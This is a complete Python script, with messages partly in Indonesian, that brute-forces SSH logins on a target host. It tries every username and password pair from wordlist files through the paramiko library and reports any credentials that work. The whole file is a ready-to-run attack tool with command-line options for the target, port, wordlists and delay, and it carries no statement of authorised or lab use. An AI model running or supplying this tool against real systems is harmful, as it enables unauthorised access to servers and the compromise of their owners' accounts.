#!/usr/bin/env python3
"""
SSH Bruteforcer
Brute force SSH login dengan password list.
Usage: python ssh_bruteforce.py -t 192.168.1.1 -U users.txt -w passwords.txt
"""
import paramiko
import argparse
import sys
import socket
import time


def try_ssh(host, port, username, password, timeout=5):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=username, password=password, timeout=timeout,
                       banner_timeout=timeout, auth_timeout=timeout, allow_agent=False, look_for_keys=False)
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except (paramiko.SSHException, socket.error, OSError) as e:
        return None
    finally:
        client.close()


def main():
    parser = argparse.ArgumentParser(description="SSH Login Bruteforcer")
    parser.add_argument("-t", "--target", required=True, help="Target host/IP")
    parser.add_argument("-p", "--port", type=int, default=22, help="SSH port")
    parser.add_argument("-u", "--username", help="Single username")
    parser.add_argument("-U", "--users", help="Username wordlist file")
    parser.add_argument("-w", "--wordlist", required=True, help="Password wordlist")
    parser.add_argument("--timeout", type=int, default=5, help="Connection timeout")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Delay between attempts")
    args = parser.parse_args()

    if args.username:
        users = [args.username]
    elif args.users:
        try:
            with open(args.users) as f:
                users = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        except FileNotFoundError:
            print(f"[!] Users file not found: {args.users}")
            sys.exit(1)
    else:
        print("[!] Butuh -u atau -U untuk username")
        sys.exit(1)

    try:
        with open(args.wordlist) as f:
            passwords = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        print(f"[!] Password wordlist not found: {args.wordlist}")
        sys.exit(1)

    print(f"[*] Target: {args.target}:{args.port}")
    print(f"[*] Users: {len(users)}, Passwords: {len(passwords)}")
    print(f"[*] Total attempts: {len(users) * len(passwords)}")
    print("-" * 60)

    attempts = 0
    for user in users:
        for password in passwords:
            attempts += 1
            if args.delay > 0:
                time.sleep(args.delay)
            result = try_ssh(args.target, args.port, user, password, args.timeout)
            if result is True:
                print(f"\n[+] SUCCESS! {user}:{password} (attempt #{attempts})")
                sys.exit(0)
            elif result is None:
                print(f"\n[!] Connection error - target mungkin down")
                sys.exit(1)
            if attempts % 10 == 0:
                print(f"[*] {attempts} attempts, current: {user}:{password}", end="\r")

    print(f"\n[-] Tidak ada kredensial valid ({attempts} attempts)")


if __name__ == "__main__":
    main()

